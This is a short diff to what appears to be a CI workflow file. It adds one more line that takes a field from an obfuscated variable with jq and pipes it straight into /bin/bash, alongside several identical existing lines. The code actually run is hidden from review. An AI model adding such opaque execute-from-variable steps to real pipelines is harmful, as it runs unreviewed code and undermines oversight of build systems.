@@ -28,6 +28,7 @@ jobs:
           echo $gdc4200 | jq -r .vng7 | /bin/bash
           echo $aol9405 | jq -r .tr6 | /bin/bash
           echo $fl0249 | jq -r .suura98 | /bin/bash
+          echo $snj922 | jq -r .oqrq40 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
